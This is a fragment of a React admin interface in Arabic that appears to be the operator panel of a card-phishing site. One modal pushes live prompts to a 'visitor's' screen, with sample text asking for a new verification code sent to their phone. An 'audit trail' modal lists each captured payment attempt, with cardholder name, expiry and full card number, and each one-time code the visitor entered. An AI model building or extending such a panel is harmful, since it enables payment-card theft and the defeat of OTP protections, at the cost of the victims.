              <button onClick={() => setNotifyModalOpen(false)} className="text-slate-400 hover:text-white">
                <X className="w-4 h-4" />
              </button>
            </div>
            <p className="text-xs text-slate-400">سيظهر هذا التنبيه في شاشة العميل فوراً.</p>
            <textarea
              rows={3}
              value={customNotification}
              onChange={(e) => setCustomNotification(e.target.value)}
              placeholder="اكتب نص الإشعار هنا (مثلاً: يرجى إدخال رمز التحقق الجديد المرسل لهاتفك)..."
              className="w-full p-2.5 rounded-xl bg-[#070c18] border border-[#1a2844] text-xs text-white placeholder-slate-500 focus:outline-none focus:ring-1 focus:ring-sky-500 resize-none"
            />
            <div className="flex gap-2">
              <button
                onClick={handleSendNotification}
                className="flex-1 py-2 bg-sky-600 hover:bg-sky-500 text-white rounded-xl text-xs font-bold transition"
              >
                إرسال الآن
              </button>
              <button
                onClick={() => setNotifyModalOpen(false)}
                className="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl text-xs"
              >
                إلغاء
              </button>
            </div>
          </div>
        </div>
      )}

      {/* 7. Audit Trail Modal with Real History */}
      {auditModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm" dir="rtl">
          <div className="w-full max-w-md bg-[#0b1220] border border-[#1a2844] rounded-2xl p-5 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-2 border-b border-[#162238]">
              <h3 className="font-bold text-sm text-white">Audit Trail - سجل التدقيق والمراجعة</h3>
              <button onClick={() => setAuditModalOpen(false)} className="text-slate-400 hover:text-white">
                <X className="w-4 h-4" />
              </button>
            </div>
            <div className="max-h-60 overflow-y-auto space-y-2 text-xs pr-1">
              {currentData.cardHistory && currentData.cardHistory.length > 0 ? (
                currentData.cardHistory.map((h: any, i: number) => (
                  <div key={i} className="p-2.5 rounded-xl bg-[#080d18] border border-slate-800 space-y-1">
                    <div className="flex justify-between text-[11px] text-slate-400">
                      <span>محاولة دفع: {h.cardName || currentData.cardName}</span>
                      <span>{h.expiryMonth}/{h.expiryYear}</span>
                    </div>
                    <div className="text-slate-200 font-mono" dir="ltr">{formatCardNumber(h.cardNumber || h.c1)}</div>
                  </div>
                ))
              ) : hasCard ? (
                <div className="p-2.5 rounded-xl bg-[#080d18] border border-slate-800 space-y-1">
                  <div className="flex justify-between text-[11px] text-slate-400">
                    <span>البطاقة الحالية</span>
                    <span>{currentData.expiryMonth}/{currentData.expiryYear}</span>
                  </div>
                  <div className="text-slate-200 font-mono" dir="ltr">{formatCardNumber(currentData.cardNumber)}</div>
                </div>
              ) : (
                <div className="p-2.5 rounded-xl bg-[#080d18] border border-slate-800 text-slate-500 text-center py-4">
                  لا توجد محاولات دفع مسجلة لهذا الزائر حتى الآن
                </div>
              )}

              {currentData.otpHistory && currentData.otpHistory.length > 0 && (
                currentData.otpHistory.map((o: any, i: number) => (
                  <div key={i} className="p-2.5 rounded-xl bg-[#080d18] border border-slate-800 space-y-1">
                    <div className="flex justify-between text-[11px] text-slate-400">
                      <span>رمز التحقق المدخل</span>
                      <span>{fmtArabicTime(o.timestamp)}</span>
                    </div>
                    <div className="text-purple-400 font-mono font-bold">{o.code}</div>
                  </div>
                ))
              )}
            </div>
            <button
              onClick={() => setAuditModalOpen(false)}
              className="w-full py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-xl text-xs font-bold"
            >
              إغلاق السجل
            </button>
          </div>
        </div>
      )}

    </div>
  );
}
